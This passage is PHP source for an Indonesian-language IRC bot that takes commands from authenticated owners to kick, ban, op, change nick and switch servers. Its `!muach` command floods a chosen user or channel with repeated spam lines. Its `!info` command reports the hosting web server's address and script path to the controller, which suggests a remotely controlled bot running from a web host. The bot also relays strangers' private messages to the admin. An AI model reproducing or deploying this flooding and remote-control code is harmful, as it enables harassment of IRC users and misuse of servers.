           if ($auth["$dNick"]["auth"]==2) {
             if ($auth["$dNick"]["status"]=="Admin") {
               if ($com[5]=="master" || $com[5]=="user") {
                 $auth["$com[4]"]["name"] = $com[4];
                 $auth["$com[4]"]["status"] = $com[5];
                 fputs($fp,'NOTICE ' . $dNick . ' :AddUser :'.$com[4].' As My '.$com[5] . CRL);
                 fputs($fp,'NOTICE ' . $com[4] . ' :Anda sekarang adalah '.$com[5].' saya, ditambahkan oleh '.$dNick.'. Ketik: pass <password> untuk mengatur password anda ' . CRL);
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :Perintah salah! Ketik: adduser <nick> <master/user> ' . CRL); }
             }
             elseif ($auth["$dNick"]["status"]=="master") {
               if (!$auth["$com[4]"]) {
                 if ($com[5]=="user") {
                   $auth["$com[4]"]["name"] = $com[4];
                   $auth["$com[4]"]["status"] = $com[5];
                   fputs($fp,'NOTICE ' . $dNick . ' :AddUser :'.$com[4].' As My '.$com[5] . CRL);
                   fputs($fp,'NOTICE ' . $com[4] . ' :Anda sekarang adalah '.$com[5].' saya ditambahkan oleh '.$dNick.'. Ketik: pass <passsword> untuk mengatur password anda ' . CRL);
                 }
                 else { fputs($fp,'NOTICE ' . $dNick . ' :Perintah salah! Ketik: adduser <nick> user ' . CRL); }
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :User telah ada! Aborting AddUser! ' . CRL); }
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Status tidak diketahui! Your Status is '.$auth["$dNick"]["status"] . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Mohon auth dulu! Ketik: auth <password> ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':deluser' && $com[4]) {
           $com[4] = strtolower($com[4]);
           if ($auth["$dNick"]["auth"]==2) {
             if ($auth["$dNick"]["status"]=="Admin") {
               if ($auth["$com[4]"]["status"]=="master" || $auth["$com[4]"]["status"]=="user") {
                 unset($auth["$com[4]"]);
                 fputs($fp,'NOTICE ' . $dNick . ' :DelUser :'.$com[4].' From My UserList ' . CRL);
                 fputs($fp,'NOTICE ' . $com[4] . ' :Your Access As My User Has Been Deleted By '.$dNick . CRL);
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :Perintah salah! Ketik: deluser <nick> ' . CRL); }
             }
             elseif ($auth["$dNick"]["status"]=="master") {
               if ($auth["$com[4]"]["status"]=="user") {
                 unset($auth["$com[4]"]);
                 fputs($fp,'NOTICE ' . $dNick . ' :DelUser :'.$com[4].' From My UserList ' . CRL);
                 fputs($fp,'NOTICE ' . $com[4] . ' :Your Access As My User Has Been Deleted By '.$dNick . CRL);
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :Perintah salah! Ketik: deluser <nick> ' . CRL); }
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Unknown Status! Your Status is '.$auth["$dNick"]["status"] . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Please Auth First! Type: auth <your pass> To Authorized ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"]) {
           if (ereg(":`",$com[3]) || ereg(":!",$com[3])) {
             $chan = strstr($dCommand,"#");
             $anick = str_replace("PRIVMSG ","",$dCommand);
             if ($com[3]==':!auth') {
               if ($auth["$dNick"]["auth"]==2) {
                 fputs($fp,'NOTICE '.$dNick.' :Tadi kan udah! ' . CRL);
               }
               else {
                 $whois = $dNick;
                 fputs($fp,'WHOIS '.$dNick . CRL);
               }
             }
             elseif ($com[3]==':`auth' && $chan) {
               if ($auth["$dNick"]["auth"]==2) {
                 fputs($fp,'PRIVMSG '.$chan.' :ok '.$dNick.' ! ' . CRL);
               }
               else { fputs($fp,'PRIVMSG '.$chan.' :'.$dNick.', ga boleh tuh! ' . CRL); }
             }
             elseif ($auth["$dNick"]["auth"]==2) {
               if ($com[3]==':!say' && $com[4] && $chan) {
                 $msg = strstr($data,":!say");
                 $msg = str_replace(":!say ","",$msg);
                 fputs($fp,'PRIVMSG '.$chan.' :'.$msg. CRL);
               }
               elseif ($com[3]==':!act' && $com[4] && $chan) {
                 $msg = strstr($data,":!act");
                 $msg = str_replace(":!act ","",$msg);
                 fputs($fp,'PRIVMSG '.$chan.' :ACTION '.$msg.''. CRL);
               }
               elseif ($com[3]==':!slap' && $com[4] && $chan) {
                 fputs($fp,'PRIVMSG '.$chan.' :ACTION slaps '.$com[4].' pke martelu 99 ton.. jiakakakakak...'. CRL);
               }
               elseif ($com[3]==':!msg' && $com[4] && $com[5]) {
                 $msg = strstr($data,":!msg");
                 $msg = str_replace(":!msg $com[4] ","",$msg);
                 fputs($fp,'PRIVMSG '.$com[4].' :'.$msg. CRL);
               }
               elseif ($com[3]==':!muach' && $com[4] && $auth["$dNick"]["status"]!="user") {
                 $msg = strstr($data,":!muach");
                 $msg = str_replace(":!muach $com[4]","",$msg);
               if (ereg("#", $com[4])) {
                 fputs($fp, 'JOIN '.$com[4] . CRL);
               }
                 fputs($fp, 'PRIVMSG '.$com[4].' :'.$msg.'4m6U12a13C7h 4M6u12A13c7H 4m6U12a13C7h 4M6u12A13c7H 4m6U12a13C7h 4M6u12A13c7H 4m6U12a1uAcH 4m6U12a13C7h 4M6u12A13c7H 4m6U12a13C7h 4M6u12A13c7H 4m6U12a13C7h 4M6u12A13c7H 4m6U12a1UaCh MuAcH mUaCh4m6U12a13C7h 4M6u12A13c7H 4m6U12a13C7h 4M6u12A13c7H 4m6U12a13C7h 4M6u12A13c7H' . CRL);
                 fputs($fp, 'NOTICE '.$com[4].' :'.$msg.'4m6U12a13C7h 4M6u12A13c7H 4m6U12a13C7h 4M6u12A13c7H 4m6U12a13C7h 4M6u12A13c7H 4m6U12a1uAcH mUaCh4m6U12a13C7h 4M6u12A13c7H 4m6U12a13C7h 4M6u12A13c7H 4m6U12a13C7h 4M6u12A13c7H 4m6U12a1uAcH mUaCh4m6U12a13C7h 4M6u12A13c7H 4m6U12a13C7h 4M6u12A13c7H 4m6U12a13C7h 4M6u12A13c7H' . CRL);
                 fputs($fp, 'PRIVMSG '.$com[4].' :MUACH '.$msg.'4m6U12a13C7h 4M6u12A13c7H 4m6U12a13C7h 4M6u12A13c7H 4m6U12a13C7h 4M6u12A13c7H 4m6U12a1uAcH mUaCh4m6U12a13C7h 4M6u12A13c7H 4m6U12a13C7h 4M6u12A13c7H 4m6U12a13C7h 4M6u12A13c7H 4m6U12a1uAcH mUaCh4m6U12a13C7h 4M6u12A13c7H 4m6U12a13C7h 4M6u12A13c7H 4m6U12a13C7h 4M6u12A13c7H' . CRL);
                 fputs($fp, 'PRIVMSG '.$com[4].' :'.$msg.'4m6U12a13C7h 4M6u12A13c7H 4m6U12a13C7h 4M6u12A13c7H 4m6U12a13C7h 4M6u12A13c7H 4m6U12a1uAcH mUaCh4m6U12a13C7h 4M6u12A13c7H 4m6U12a13C7h 4M6u12A13c7H 4m6U12a13C7h 4M6u12A13c7H 4m6U12a1uAcH mUaCh4m6U12a13C7h 4M6u12A13c7H 4m6U12a13C7h 4M6u12A13c7H 4m6U12a13C7h 4M6u12A13c7H' . CRL);
                 fputs($fp, 'NOTICE '.$com[4].' :'.$msg.'4m6U12a13C7h 4M6u12A13c7H 4m6U12a13C7h 4M6u12A13c7H 4m6U12a13C7h 4M6u12A13c7H 4m6U12a1uAcH mUaCh4m6U12a13C7h 4M6u12A13c7H 4m6U12a13C7h 4M6u12A13c7H 4m6U12a13C7h 4M6u12A13c7H 4m6U12a1uAcH mUaCh4m6U12a13C7h 4M6u12A13c7H 4m6U12a13C7h 4M6u12A13c7H 4m6U12a13C7h 4M6u12A13c7H' . CRL);
                 fputs($fp, 'PRIVMSG '.$com[4].' :FLOOD '.$msg.'4m6U12a13C7h 4M6u12A13c7H 4m6U12a13C7h 4M6u12A13c7H 4m6U12a13C7h 4M6u12A13c7H 4m6U12a1uAcH mUaCh4m6U12a13C7h 4M6u12A13c7H 4m6U12a13C7h 4M6u12A13c7H 4m6U12a13C7h 4M6u12A13c7H 4m6U12a1uAcH mUaCh4m6U12a13C7h 4M6u12A13c7H 4m6U12a13C7h 4M6u12A13c7H 4m6U12a13C7h 4M6u12A13c7H' . CRL);
               if (ereg("#", $com[4])) {
                 fputs($fp, 'PART '.$com[4].' :'.$msg . CRL);
               }
               }
               elseif ($com[3]==':!notice' && $com[4] && $com[5]) {
                 $msg = strstr($data,":!notice");
                 $msg = str_replace(":!notice $com[4] ","",$msg);
                 fputs($fp,'NOTICE '.$com[4].' :'.$msg. CRL);
               }
               elseif ($com[3]==':!ctcp' && $com[4] && $com[5]) {
                 $msg = strstr($data,":!ctcp");
                 $msg = str_replace(":!ctcp $com[4] ","",$msg);
                 fputs($fp,'PRIVMSG '.$com[4].' :'.$msg.''. CRL);
               }
               elseif ($com[3]==':!ping' && $chan) {
                 $sml = $smile[rand(0,count($smile) - 1)];
                 fputs($fp,'PRIVMSG '.$chan.' :'.$dNick.', PONG! '.$sml. CRL);
               }
               elseif ($com[3]==':!info') {
                 if ($auth["$dNick"]["status"]=="Admin") {
                 $bhost = $_SERVER['HTTP_HOST'];
                 $bip = $_SERVER['SERVER_ADDR'];
                 $bphp  = $_SERVER['PHP_SELF'];
                 $bruri = $_SERVER['REQUEST_URI'];
                 $brip = $_SERVER['REMOTE_ADDR'];
                 $brport = $_SERVER['REMOTE_PORT'];
                 fputs($fp,"NOTICE $dNick :Host: $bhost | Script: $bphp | Referer: $bruri | IP: $bip | Your IP: $brip Port:$brport" . CRL);
                }
               }
               elseif ($com[3]==':!upgrade') {
                 if ($auth["$dNick"]["status"]=="Admin") {
                 $bhost = $_SERVER['HTTP_HOST'];
                 $bphp  = $_SERVER['PHP_SELF'];
                 $bruri = $_SERVER['REQUEST_URI'];
                 $upgd = implode('',@file('http://'.$bhost.$bruri));
                 fputs($fp,"NOTICE $dNick :Upgrade Sukses! Exiting.." . CRL);
                 exit();
                }
               }
               elseif ($com[3]==':!up' && $chan) {
                 fputs($fp, 'PRIVMSG chanserv :op '.$chan.' '.$nick . CRL);
               }
               elseif ($com[3]==':!down' && $chan) {
                 fputs($fp, 'MODE '.$chan.' +v-o '.$nick.' '.$nick . CRL);
               }
               elseif ($com[3]==':!cycle' && $chan && $auth["$dNick"]["status"]!="user") {
                 $msg = strstr($data,":!cycle");
                 if (ereg("#", $com[4])) {
                   $partchan = $com[4];
                   $msg = str_replace(":!cycle $com[4]","",$msg);
                 }
                 else {
                   $partchan = $chan;
                   $msg = str_replace(":!cycle","",$msg);
                 }
                 if (strlen($msg)<3) {
                   $msg = '';
                 }
                 fputs($fp, 'PART '.$partchan.' :'.$msg . CRL);
                 fputs($fp, 'JOIN '.$partchan . CRL);
               }
               elseif ($com[3]==':!part' && $auth["$dNick"]["status"]=="Admin") {
                 $msg = strstr($data,":!part");
                 if (ereg("#", $com[4])) {
                   $partchan = $com[4];
                   $msg = str_replace(":!part $com[4]","",$msg);
                 }
                 else {
                   $partchan = $chan;
                   $msg = str_replace(":!part","",$msg);
                 }
                 if (strlen($msg)<3) {
                   $msg = '';
                 }
                 fputs($fp, 'PART '.$partchan.' :'.$msg . CRL);
                 $remchan = strtolower($partchan);
                 if (in_array($remchan, $channel)) {
                   $channels = str_replace("$remchan ","",$channels);
                   unset($channel);
                   $channel = explode(" ", $channels);
                 }
                 foreach ($channel as $v) {
                   fputs($fp, 'JOIN '.$v . CRL);
                 }
               }
               //elseif ($com[3]==':!join' && $com[4] && $auth["$dNick"]["status"]=="Admin") {
               elseif ($com[3]==':!join' && $com[4] && $auth["$dNick"]["status"]!="User") {
                 if (!ereg("#",$com[4])) { $com[4]="#".$com[4]; }
                 $v = strtolower($com[4]);
                 sleep(rand(1,6));
                 fputs($fp, 'JOIN '.$v . CRL);
               }
               //elseif ($com[3]==':!botnick' && $com[4] && !$chan && $auth["$dNick"]["status"]=="Admin") {
               elseif ($com[3]==':!botnick' && $com[4] && !$chan && $auth["$dNick"]["status"]!="User") {
                 $nick = $com[4];
                 $identify = $com[5];
                 fputs($fp, 'NICK '.$nick . CRL);
                 fputs($fp, 'PRIVMSG nickserv :identify '.$nick.' '.$identify.  CRL);
               }
               elseif ($com[3]==':!k' && $com[4] && $chan) {
                 $msg = strstr($data,":!k");
                 $msg = str_replace(":!k $com[4]","",$msg);
                 fputs($fp, 'KICK '.$chan.' '.$com[4].' :'.$msg . CRL);
               }
               elseif ($com[3]==':!kb' && $com[4] && $chan) {
                 $msg = strstr($data,":!kb");
                 $msg = str_replace(":!kb $com[4]","",$msg);
                 fputs($fp, 'KICK '.$chan.' '.$com[4].' :'.$msg . CRL);
                 fputs($fp, 'MODE '.$chan.' +b '.$com[4] . CRL);
               }
               elseif ($com[3]==':!changenick') {
                 $nick = $nicky[rand(0,count($nicky) - 1)];
                 fputs($fp, 'NICK '.$nick . CRL);
                 if (substr($dCommand,0,3)=='433') {
                   $nick = $nicky[rand(0,count($nicky) - 1)];
                   fputs($fp, 'NICK '.$nick . CRL);
                 }
               }
               elseif ($com[3]==':!op' && $chan) {
                 if ($com[4]) { $opnick = $com[4]; }
                 else { $opnick = $dNick; }
                 fputs($fp, 'MODE '.$chan.' +ooo '.$opnick.' '.$com[5].' '.$com[6] . CRL);
               }
               elseif ($com[3]==':!deop' && $chan) {
                 if ($com[4]) { $opnick = $com[4]; }
                 else { $opnick = $dNick; }
                 fputs($fp, 'MODE '.$chan.' -o+v-oo '.$opnick.' '.$opnick.' '.$com[5].' '.$com[6] . CRL);
               }
               elseif ($com[3]==':!v' && $chan) {
                 if ($com[4]) { $vonick = $com[4]; }
                 else { $vonick = $dNick; }
                 fputs($fp, 'MODE '.$chan.' +vvv '.$vonick.' '.$com[5].' '.$com[6] . CRL);
               }
               elseif ($com[3]==':!dv' && $chan) {
                 if ($com[4]) { $vonick = $com[4]; }
                 else { $vonick = $dNick; }
                 fputs($fp, 'MODE '.$chan.' -vvv '.$vonick.' '.$com[5].' '.$com[6] . CRL);
               }
               elseif ($com[3]==':!away' && $auth["$dNick"]["status"]=="Admin") {
                 $msg = strstr($data,":`awaymsg");
                 $msg = str_replace(":`awaymsg","",$msg);
                 if (strlen($msg)<3) {
                   $raway="on";
                   fputs($fp,'AWAY : ' . 'AWAY' . CRL);
                 }
                 else {
                   $raway="off";
                   fputs($fp,'AWAY : ' . $msg . CRL);
                 }
               }
               elseif ($com[3]==':!mode' && $com[4] && $chan) {
                 fputs($fp, 'MODE '.$chan.' :'.$com[4].' '.$com[5] . CRL);
               }
               elseif ($com[3]==':!nickmode' && $com[4]) {
                 $nickmode = $com[4];
                 fputs($fp, 'MODE '.$nick.' :'.$nickmode . CRL);
               }
               elseif ($com[3]==':!userlist') {
                 $userlist="";
                 foreach ($auth as $user) {
                   if ($user["pass"]) { $pass="-pass ok"; }
                   else { $pass="-no pass"; }
                   $userlist .= $user["name"].'('.$user["status"].$pass.') ';
                 }
                 fputs($fp, 'NOTICE '.$dNick.' :User List: '.$userlist . CRL);
               }
               elseif ($com[3]==':!quit' && $auth["$dNick"]["status"]=="Admin") {
                 $msg = strstr($data,":!quit");
                 $msg = str_replace(":!quit","",$msg);
                 if (strlen($msg)>3) {
                   $msg = str_replace(" ","_",$msg);
                 }
                 $quitmsg = $quitmsglist[rand(0,count($quitmsglist) - 1)];
                 fputs($fp, 'QUIT ' . $quitmsg . CRL);
                 $keluar = 1;
                 exit;
               }
               elseif ($com[3]==':!vhost' && $auth["$dNick"]["status"]=="Admin") {
                 if ($com[4]) { $localhost = $com[4]; }
                 else { $localhost = 'localhost'; }
                 $keluar = 0;
                 fputs($fp, 'QUIT ' . CRL);
               }
               elseif ($com[3]==':!jump' && $auth["$dNick"]["status"]=="Admin") {
                 if (empty($com[4])) {
                   $remotehost = $remotehost2[rand(0,count($remotehost2) - 1)];
                 }
                 else { $remotehost = $com[4]; }
                 $keluar = 0;
                 fputs($fp, "QUIT Ganti_Server".CRL);
               }
               elseif ($com[3]==':!ident' && $auth["$dNick"]["status"]=="Admin") {
                 if (!$com[4]) { $username = $username; }
                 else { $username = $com[4]; }
                 $keluar = 0;
                 fputs($fp, 'QUIT Ganti_Ident ' . CRL);
               }
               elseif ($com[3]==':!fullname' && $auth["$dNick"]["status"]=="Admin") {
                 if (!$com[4]) { $realname = "--"; }
                 else { $realname = $com[4]; }
                 $keluar = 0;
                 fputs($fp, 'QUIT Ganti_Nama ' . CRL);
               }
               elseif ($com[3]==':!topic' && $com[4] && $chan) {
                 $msg = strstr($data,":!topic");
                 $msg = str_replace(":!topic ","",$msg);
                 fputs($fp, 'TOPIC '.$chan.' :'.$msg . CRL);
               }
               elseif ($com[3]==':!help' && !$chan) {
                 fputs($fp,'PING 12886241614'. CRL);
                 $msgdelay = 0;
                 foreach ($helptext as $baris){
                   $msgdelay++;
                   if($msgdelay >= 2) { sleep(2) ; $msgdelay = 0; }
                   fputs($fp,'PRIVMSG '.$dNick.' :'.$baris. CRL);
                 }
                 unset($baris);
                 unset($msgdelay);
               }
               /*** AUTO RESPONSE COMMAND BY Irullz **/
               elseif ($com[3]==':!ngomong') {
                 $ngomong = TRUE;
                 $autowelcome = TRUE;
                 if ($chan) {fputs($fp,'PRIVMSG '.$chan.' :ACTION makacih boss Sayangqu. aq bisa ngomong lagi!'. CRL); }
                 else { fputs($fp,'NOTICE '.$dNick.' :Ok boss Sayangqu, gue ngomong deh. ' . CRL); }
               }
               elseif ($com[3]==':!diam') {
                 $ngomong = FALSE;
                 $autowelcome = TRUE;
                 if ($chan) { fputs($fp,'PRIVMSG '.$chan.' :ACTION oke boss Sayangqu... como ba diam akh... :('. CRL); }
                 else { fputs($fp,'NOTICE '.$dNick.' :Ok boss Sayangqu, gue diem deh. ' . CRL); }
               }
               elseif ($com[3]==':!wb') {
                 $wbn = $com[4];
                 $msg = strstr($data,":!wb");
                 $msg = str_replace(":!wb $wbn ","",$msg);
                 $nickwb[] = array($wbn,$msg);
                 if ($chan) { fputs($fp,'PRIVMSG '.$chan.' :Seep! '.$wbn.' ('.$msg.')'. CRL); }
                 else { fputs($fp,'NOTICE '.$dNick.' :Seep! '.$wbn.' ('.$msg.')'. CRL); }
               }
             }
             else { fputs($fp,'NOTICE '.$dNick.' :Mohon auth dulu! Ketik: auth <password> '. CRL); }
           }
         }
         elseif (!$auth["$dNick"] && !eregi("auth",$iText)) {
           if (eregi("www.",$iText) || eregi("http:",$iText) || eregi("join #",$iText)) {
             if (!ereg("#",$dCommand)) {
               if ($log=="on") {
                 fputs($fp,'PRIVMSG '. $admin .' :4inviter: ' . $dFrom . '2:' .$iText. CRL);
               }
               $inv = strstr($dFrom,'@');
               foreach ($auth as $user) {
                 if ($user["status"]=="user") {
                   fputs($fp, 'NOTICE '.$user["name"].' :KB '.$chan.' '.$dNick.' '.$inv.'' . CRL);
                 }
               }
             }
           }
           elseif (!ereg("#",$dCommand) && $log=="on") {
             fputs($fp,'PRIVMSG '.$admin.' :6' . $dFrom . '12:' .$iText. CRL);
           }
         }
       }
     }
     elseif (substr($data,0,4) == 'PING') {
       fputs($fp,'PONG ' . substr($data,5) . CRL);
     }
   }
 }
 fclose($fp);
} while ($keluar == 0);
}

hajar();

?>









